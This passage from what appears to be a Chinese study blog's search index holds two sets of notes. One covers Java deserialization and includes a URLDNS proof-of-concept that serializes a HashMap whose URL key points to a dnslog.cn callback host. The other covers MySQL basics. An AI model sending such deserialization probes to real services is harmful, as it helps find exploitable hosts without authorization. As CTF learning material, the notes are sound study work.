class=\"line\">       <span class=\"type\">int</span> <span class=\"variable\">mappings</span> <span class=\"operator\">=</span> s.readInt(); <span class=\"comment\">// Read number of mappings (size)</span></span><br><span class=\"line\">       <span class=\"keyword\">if</span> (mappings &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">           <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InvalidObjectException</span>(<span class=\"string\">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (mappings == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">           <span class=\"comment\">// use defaults</span></span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (mappings &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">           <span class=\"type\">float</span> <span class=\"variable\">fc</span> <span class=\"operator\">=</span> (<span class=\"type\">float</span>)mappings / lf + <span class=\"number\">1.0f</span>;</span><br><span class=\"line\">           <span class=\"type\">int</span> <span class=\"variable\">cap</span> <span class=\"operator\">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class=\"line\">                      DEFAULT_INITIAL_CAPACITY :</span><br><span class=\"line\">                      (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class=\"line\">                      MAXIMUM_CAPACITY :</span><br><span class=\"line\">                      tableSizeFor((<span class=\"type\">int</span>)fc));</span><br><span class=\"line\">           <span class=\"type\">float</span> <span class=\"variable\">ft</span> <span class=\"operator\">=</span> (<span class=\"type\">float</span>)cap * lf;</span><br><span class=\"line\">           threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class=\"line\">                        (<span class=\"type\">int</span>)ft : Integer.MAX_VALUE);</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"comment\">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class=\"line\">           <span class=\"comment\">// what we&#x27;re actually creating.</span></span><br><span class=\"line\">           SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class=\"line\">           <span class=\"meta\">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class=\"line\">           Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>[cap];</span><br><span class=\"line\">           table = tab;</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"comment\">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class=\"line\">           <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; mappings; i++) &#123;</span><br><span class=\"line\">               <span class=\"meta\">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class=\"line\">                   <span class=\"type\">K</span> <span class=\"variable\">key</span> <span class=\"operator\">=</span> (K) s.readObject();</span><br><span class=\"line\">               <span class=\"meta\">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class=\"line\">                   <span class=\"type\">V</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> (V) s.readObject();</span><br><span class=\"line\">               putVal(hash(key), key, value, <span class=\"literal\">false</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>跟进<code>hash()</code>函数看看是如何实现的，当<code>key!=null</code>时会调用<code>hashCode()</code>函数。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"title function_\">hash</span><span class=\"params\">(Object key)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> h;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (key == <span class=\"literal\">null</span>) ? <span class=\"number\">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class=\"number\">16</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>URLDNS</code>是利用<code>URL</code>对象，于是跟进<code>Java</code>基本类<code>URL</code>中关于<code>hashCode()</code>的部分<code>java/net/URL.java</code>，由于我们可以设置<code>hashCode</code>的值默认为<code>-1</code>，因此会执行<code>hashCode = handler.hashCode(this)</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">public synchronized int hashCode() &#123;</span><br><span class=\"line\">    if (hashCode != -1)</span><br><span class=\"line\">        return hashCode;</span><br><span class=\"line\"></span><br><span class=\"line\">    hashCode = handler.hashCode(this);</span><br><span class=\"line\">    return hashCode;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>下面是handler.hashCode()代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"type\">int</span> <span class=\"title function_\">hashCode</span><span class=\"params\">(URL u)</span> &#123;</span><br><span class=\"line\">       <span class=\"type\">int</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"comment\">// Generate the protocol part.</span></span><br><span class=\"line\">       <span class=\"type\">String</span> <span class=\"variable\">protocol</span> <span class=\"operator\">=</span> u.getProtocol();</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (protocol != <span class=\"literal\">null</span>)</span><br><span class=\"line\">           h += protocol.hashCode();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"comment\">// Generate the host part.</span></span><br><span class=\"line\">       <span class=\"type\">InetAddress</span> <span class=\"variable\">addr</span> <span class=\"operator\">=</span> getHostAddress(u);</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (addr != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">           h += addr.hashCode();</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"type\">String</span> <span class=\"variable\">host</span> <span class=\"operator\">=</span> u.getHost();</span><br><span class=\"line\">           <span class=\"keyword\">if</span> (host != <span class=\"literal\">null</span>)</span><br><span class=\"line\">               h += host.toLowerCase().hashCode();</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"comment\">// Generate the file part.</span></span><br><span class=\"line\">       <span class=\"type\">String</span> <span class=\"variable\">file</span> <span class=\"operator\">=</span> u.getFile();</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (file != <span class=\"literal\">null</span>)</span><br><span class=\"line\">           h += file.hashCode();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"comment\">// Generate the port part.</span></span><br><span class=\"line\">       <span class=\"keyword\">if</span> (u.getPort() == -<span class=\"number\">1</span>)</span><br><span class=\"line\">           h += getDefaultPort();</span><br><span class=\"line\">       <span class=\"keyword\">else</span></span><br><span class=\"line\">           h += u.getPort();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"comment\">// Generate the ref part.</span></span><br><span class=\"line\">       <span class=\"type\">String</span> <span class=\"variable\">ref</span> <span class=\"operator\">=</span> u.getRef();</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (ref != <span class=\"literal\">null</span>)</span><br><span class=\"line\">           h += ref.hashCode();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">return</span> h;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到这里调用了一个函数<code>getHostAddress()</code>来进行<code>DNS</code>解析返回对应的<code>IP</code>。</p>\n<p>即进行了DNS查询。</p>\n<p>做做ctfshow的DNSURL题目。</p>\n<p>这是网上的POC，我们根据代码看看我们需要分析些什么：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.MalformedURLException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLConnection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLStreamHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">URLDNS</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class=\"line\">        <span class=\"type\">URLStreamHandler</span> <span class=\"variable\">handler</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">URLStreamHandler</span>() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">protected</span> URLConnection <span class=\"title function_\">openConnection</span><span class=\"params\">(URL u)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">HashMap</span> <span class=\"variable\">map</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;http://xkesxe.dnslog.cn&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">URL</span> <span class=\"variable\">u</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">URL</span>(<span class=\"literal\">null</span>, url, handler);</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">code</span> <span class=\"operator\">=</span> u.getClass().getDeclaredField(<span class=\"string\">&quot;hashCode&quot;</span>);</span><br><span class=\"line\">        code.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        code.set(u, -<span class=\"number\">1</span>);</span><br><span class=\"line\">        map.put(u, url);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">stream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;test.data&quot;</span>));</span><br><span class=\"line\">        stream.writeObject(map);</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">stream1</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;test.data&quot;</span>));</span><br><span class=\"line\">        stream1.readObject();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里要注意的是URL实例u的hashcode不是-1，而是经过计算成为其他的值了。</p>\n<p>所以要进行修改，而hashcode为private，所以需要code.setAccessible(true);</p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1015078\">深入理解 Java 反射：Field （成员变量） - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>\n<p><a href=\"https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/Java-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md\">CTF&#x2F;Java-序列化和反序列化-学习笔记.md at main · bfengj&#x2F;CTF (github.com)</a></p>\n<p>Field来自java.lang.reflect.Field，很明显其跟反射有关。具体看上面链接。</p>\n<h2 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h2><p><a href=\"http://rui0.cn/archives/1015\">Code-Breaking Puzzles — javacon WriteUp - Ruilin (rui0.cn)</a></p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html\">Code-Breaking中的两个Python沙箱 | 离别歌 (leavesongs.com)</a></p>\n<p><a href=\"http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/\">Python反序列化漏洞的花式利用 | Bendawang’s site</a></p>\n<h2 id=\"Other\"><a href=\"#Other\" class=\"headerlink\" title=\"Other\"></a>Other</h2><h3 id=\"Java-runtime类介绍\"><a href=\"#Java-runtime类介绍\" class=\"headerlink\" title=\"Java runtime类介绍\"></a>Java runtime类介绍</h3><h3 id=\"JNDI注入\"><a href=\"#JNDI注入\" class=\"headerlink\" title=\"JNDI注入\"></a>JNDI注入</h3><h3 id=\"LOG4J分析\"><a href=\"#LOG4J分析\" class=\"headerlink\" title=\"LOG4J分析\"></a>LOG4J分析</h3><h3 id=\"表达式上下文\"><a href=\"#表达式上下文\" class=\"headerlink\" title=\"表达式上下文\"></a>表达式上下文</h3><h2 id=\"CTFSHOW\"><a href=\"#CTFSHOW\" class=\"headerlink\" title=\"CTFSHOW\"></a>CTFSHOW</h2>","tags":["java"]},{"title":"mysql_basic","url":"/2023/03/03/mysql-basic/","content":"<h1 id=\"mysql概述\"><a href=\"#mysql概述\" class=\"headerlink\" title=\"mysql概述\"></a>mysql概述</h1><h2 id=\"数据库相关概念\"><a href=\"#数据库相关概念\" class=\"headerlink\" title=\"数据库相关概念\"></a>数据库相关概念</h2><table>\n<thead>\n<tr>\n<th>名称</th>\n<th>全称</th>\n<th>简称</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>数据库</td>\n<td>存储数据的仓库，数据是有组织的进行存储</td>\n<td>DataBase（DB）</td>\n</tr>\n<tr>\n<td>数据库管理系统</td>\n<td>操纵和管理数据库的大型软件</td>\n<td>DataBase Management System (DBMS)</td>\n</tr>\n<tr>\n<td>SQL</td>\n<td>操作关系型数据库的语言，定义了一套操作关系型数据库统一标准</td>\n<td>Structured Query Language (SQL)</td>\n</tr>\n</tbody></table>\n<h2 id=\"MySQL数据库\"><a href=\"#MySQL数据库\" class=\"headerlink\" title=\"MySQL数据库\"></a>MySQL数据库</h2><h3 id=\"版本\"><a href=\"#版本\" class=\"headerlink\" title=\"版本\"></a>版本</h3><p>MySQL官方提供了两种不同的版本：</p>\n<p> 社区版本（MySQL Community Server） 免费， MySQL不提供任何技术支持 </p>\n<p>商业版本（MySQL Enterprise Edition） 收费，可以使用30天，官方提供技术支持</p>\n<h3 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h3><p>略</p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><h3 id=\"启动与停止\"><a href=\"#启动与停止\" class=\"headerlink\" title=\"启动与停止\"></a>启动与停止</h3><p>cmd输入services.msc</p>\n<p>找到</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303094200943.png\" alt=\"image-20230303094200943\"></p>\n<p>控制登录与启动</p>\n<p>或者命令行：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">net start mysql80</span><br><span class=\"line\">net stop mysql80</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"客户端连接\"><a href=\"#客户端连接\" class=\"headerlink\" title=\"客户端连接\"></a>客户端连接</h3><p> 方式一：使用MySQL提供的客户端命令行工具</p>\n<p>方式二：使用系统自带的命令行工具执行指令（需要配置系统变量）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql [-h 127.0.0.1] [-P 3306] -u root -p</span><br><span class=\"line\">参数：</span><br><span class=\"line\">-h : MySQL服务所在的主机IP</span><br><span class=\"line\">-P : MySQL服务端口号， 默认3306</span><br><span class=\"line\">-u : MySQL数据库用户名</span><br><span class=\"line\">-p ： MySQL数据库用户名对应的密码</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"数据模型\"><a href=\"#数据模型\" class=\"headerlink\" title=\"数据模型\"></a>数据模型</h3><h4 id=\"关系型数据库（RDBMS）\"><a href=\"#关系型数据库（RDBMS）\" class=\"headerlink\" title=\"关系型数据库（RDBMS）\"></a>关系型数据库（RDBMS）</h4><p>概念：建立在关系模型基础上，由多张相互连接的二维表组成的数据库。 而所谓二维表，指的是由行和列组成的表，如下图（就类似于Excel表格数据，有表头、有列、有行， 还可以通过一列关联另外一个表格中的某一列数据）。我们之前提到的MySQL、Oracle、DB2、 SQLServer这些都是属于关系型数据库，里面都是基于二维表存储数据的。简单说，基于二维表存储 数据的数据库就成为关系型数据库，不是基于二维表存储数据的数据库，就是非关系型数据库。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303095014254.png\" alt=\"image-20230303095014254\"></p>\n<p>特点： A. 使用表存储数据，格式统一，便于维护。 B. 使用SQL语言操作，标准统一，使用方便。</p>\n<h4 id=\"数据模型-1\"><a href=\"#数据模型-1\" class=\"headerlink\" title=\"数据模型\"></a>数据模型</h4><p>MySQL是关系型数据库，是基于二维表进行数据存储的，具体的结构图下：</p>\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303095111026.png\" alt=\"image-20230303095111026\" style=\"zoom:50%;\" />\n\n<p>我们可以通过MySQL客户端连接数据库管理系统DBMS，然后通过DBMS操作数据库。</p>\n<p> 可以使用SQL语句，通过数据库管理系统操作数据库，以及操作数据库中的表结构及数据。</p>\n<p> 一个数据库服务器中可以创建多个数据库，一个数据库中也可以包含多张表，而一张表中又可以包 含多行记录。</p>\n<h1 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h1><h2 id=\"SQL通用语法\"><a href=\"#SQL通用语法\" class=\"headerlink\" title=\"SQL通用语法\"></a>SQL通用语法</h2><p>1). SQL语句可以单行或多行书写，以分号结尾。</p>\n<p> 2). SQL语句可以使用空格&#x2F;缩进来增强语句的可读性。 </p>\n<p>3). MySQL数据库的SQL语句不区分大小写，关键字建议使用大写。 </p>\n<p>4). 注释： 单行注释：– 注释内容 或 # 注释内容 多行注释：&#x2F;*注释内容 *&#x2F;</p>\n<h2 id=\"SQL分类\"><a href=\"#SQL分类\" class=\"headerlink\" title=\"SQL分类\"></a>SQL分类</h2><table>\n<thead>\n<tr>\n<th align=\"center\">分 类</th>\n<th align=\"center\">全称</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">DDL</td>\n<td align=\"center\">Data Definition Language</td>\n<td align=\"center\">数据定义语言，用来定义数据库对象(数据库，表， 字段)</td>\n</tr>\n<tr>\n<td align=\"center\">DML</td>\n<td align=\"center\">Data Manipulation Language</td>\n<td align=\"center\">数据操作语言，用来对数据库表中的数据进行增删改</td>\n</tr>\n<tr>\n<td align=\"center\">DQL</td>\n<td align=\"center\">Data Query Language</td>\n<td align=\"center\">数据查询语言，用来查询数据库中表的记录</td>\n</tr>\n<tr>\n<td align=\"center\">DCL</td>\n<td align=\"center\">Data Control Language</td>\n<td align=\"center\">数据控制语言，用来创建数据库用户、控制数据库的 访问权限</td>\n</tr>\n</tbody></table>\n<h2 id=\"DDL\"><a href=\"#DDL\" class=\"headerlink\" title=\"DDL\"></a>DDL</h2><h3 id=\"数据库操作\"><a href=\"#数据库操作\" class=\"headerlink\" title=\"数据库操作\"></a>数据库操作</h3><p>1). 查询所有数据库 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">show databases ;</span><br></pre></td></tr></table></figure>\n\n<p>2). 查询当前数据库 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select database() ;</span><br></pre></td></tr></table></figure>\n\n<p>3). 创建数据库 create database [ if not exists ] 数据库名 [ default charset 字符集 ] [ collate 排序 规则 ] ;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create database [ if not exists ] 数据库名 [ default charset 字符集 ] [ collate 排序</span><br><span class=\"line\">规则 ] ;</span><br></pre></td></tr></table></figure>\n\n<p>eg:</p>\n<p>A:创建一个itcast数据库, 使用数据库默认的字符集。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create database itcast;</span><br><span class=\"line\">create database if not extists itcast;</span><br></pre></td></tr></table></figure>\n\n<p>B:创建一个itheima数据库，并且指定字符集</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create database itheima default charset utf8mb4;</span><br><span class=\"line\">-- create database itheima default charset utf8;一般不建议使用utf-8</span><br></pre></td></tr></table></figure>\n\n<p>4). 删除数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">drop database [ if exists ] 数据库名 ;</span><br></pre></td></tr></table></figure>\n\n<p>5). 切换数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">use 数据库名 ;</span><br><span class=\"line\"># 可以使用select database();看自己当前使用的哪个数据库</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"表操作\"><a href=\"#表操作\" class=\"headerlink\" title=\"表操作\"></a>表操作</h3><h4 id=\"查询创建\"><a href=\"#查询创建\" class=\"headerlink\" title=\"查询创建\"></a>查询创建</h4><p>1). 查询当前数据库所有表 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">show tables; </span><br></pre></td></tr></table></figure>\n\n<p>2). 查看指定表结构 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">desc 表名 ;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303102245084.png\" alt=\"image-20230303102245084\"></p>\n<p>通过这条指令，我们可以查看到指定表的字段，字段的类型、是否可以为NULL，是否存在默认值等信 息。</p>\n<p> 3). 查询指定表的建表语句 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">show create table 表名 ;</span><br></pre></td></tr></table></figure>\n\n<p>通过这条指令，主要是用来查看建表语句的，而有部分参数我们在创建表的时候，并未指定也会查询 到，因为这部分是数据库的默认值，如：存储引擎、字符集等。</p>\n<p>4). 创建表结构</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CREATE TABLE 表名(</span><br><span class=\"line\">字段1 字段1类型 [ COMMENT 字段1注释 ],</span><br><span class=\"line\">字段2 字段2类型 [COMMENT 字段2注释 ],</span><br><span class=\"line\">字段3 字段3类型 [COMMENT 字段3注释 ],</span><br><span class=\"line\">......</span><br><span class=\"line\">字段n 字段n类型 [COMMENT 字段n注释 ]</span><br><span class=\"line\">) [ COMMENT 表注释 ] ;</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create table tb_user(</span><br><span class=\"line\">id int comment &#x27;编号&#x27;,</span><br><span class=\"line\">name varchar(50) comment &#x27;姓名&#x27;,</span><br><span class=\"line\">age int comment &#x27;年龄&#x27;,</span><br><span class=\"line\">gender varchar(1) comment &#x27;性别&#x27;</span><br><span class=\"line\">) comment &#x27;用户表&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303102945089.png\" alt=\"image-20230303102945089\"></p>\n<h4 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h4><p>参考菜鸟教程</p>\n<p><a href=\"https://www.runoob.com/mysql/mysql-data-types.html\">MySQL 数据类型 | 菜鸟教程 (runoob.com)</a></p>\n<p>1). 数值类型</p>\n<p>例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1). 年龄字段 -- 不会出现负数, 而且人的年龄不会太大</span><br><span class=\"line\">age tinyint unsigned</span><br><span class=\"line\">2). 分数 -- 总分100分, 最多出现一位小数</span><br><span class=\"line\">score double(4,1)</span><br></pre></td></tr></table></figure>\n\n<p>2). 字符串类型</p>\n<p>vchar性能比char要低一些</p>\n<p>用户名：vchar</p>\n<p>性别：char</p>\n<p>3). 日期时间类型</p>\n<h4 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h4><p>设计一张员工信息表，要求如下：</p>\n<ol>\n<li>编号（纯数字） </li>\n<li>员工工号 (字符串类型，长度不超过10位) </li>\n<li>员工姓名（字符串类型，长度不超过10位） </li>\n<li>性别（男&#x2F;女，存储一个汉字） </li>\n<li>年龄（正常人年龄，不可能存储负数） </li>\n<li>身份证号（二代身份证号均为18位，身份证中有X这样的字符） 入职时间（取值年月日即可）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create table emp(</span><br><span class=\"line\">    id int comment &quot;编号&quot;,</span><br><span class=\"line\">    workno varchar(10) comment &quot;员工工号&quot;,</span><br><span class=\"line\">    name varchar(10) comment &#x27;姓名&#x27;,</span><br><span class=\"line\">\tgender char(1) comment &#x27;性别&#x27;,</span><br><span class=\"line\">\tage tinyint unsigned comment &#x27;年龄&#x27;,</span><br><span class=\"line\">\tidcard char(18) comment &#x27;身份证号&#x27;,</span><br><span class=\"line\">\tentrydate date comment &#x27;入职时间&#x27;</span><br><span class=\"line\">) comment &quot;员工表&quot;;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改\"><a href=\"#修改\" class=\"headerlink\" title=\"修改\"></a>修改</h4><p>1). 添加字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE 表名 ADD 字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];</span><br></pre></td></tr></table></figure>\n\n<p>案例: </p>\n<p>为emp表增加一个新的字段”昵称”为nickname，类型为varchar(20)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE emp ADD nickname varchar(20) COMMENT &#x27;昵称&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>2). 修改数据类型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE 表名 MODIFY 字段名 新数据类型 (长度);</span><br></pre></td></tr></table></figure>\n\n<p>3). 修改字段名和字段类型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];</span><br></pre></td></tr></table></figure>\n\n<p>案例: 将emp表的nickname字段修改为username，类型为varchar(30)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT &#x27;昵称&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>4). 删除字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE 表名 DROP 字段名;</span><br></pre></td></tr></table></figure>\n\n<p>案例: 将emp表的字段username删除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE emp DROP username;</span><br></pre></td></tr></table></figure>\n\n<p>5). 修改表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE 表名 RENAME TO 新表名;</span><br></pre></td></tr></table></figure>\n\n<p>案例:</p>\n<p> 将emp表的表名修改为 employee</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE emp RENAME TO employee;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"删除\"><a href=\"#删除\" class=\"headerlink\" title=\"删除\"></a>删除</h4><p>1). 删除表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DROP TABLE [ IF EXISTS ] 表名;</span><br><span class=\"line\">DROP TABLE IF EXISTS tb_user;</span><br></pre></td></tr></table></figure>\n\n<p>2). 删除指定表, 并重新创建表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">TRUNCATE TABLE 表名;-- 在删除表的时候，表中的全部数据也都会被删除。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"图形化界面工具\"><a href=\"#图形化界面工具\" class=\"headerlink\" title=\"图形化界面工具\"></a>图形化界面工具</h2><p>主流工具：sqlyog、Navicate、DataGrip</p>\n<p>这次使用DataGrip</p>\n<p>还挺好用，不会的sql可以在这里面看对于语句。</p>\n<h2 id=\"DML\"><a href=\"#DML\" class=\"headerlink\" title=\"DML\"></a>DML</h2><h3 id=\"添加数据（INSERT）\"><a 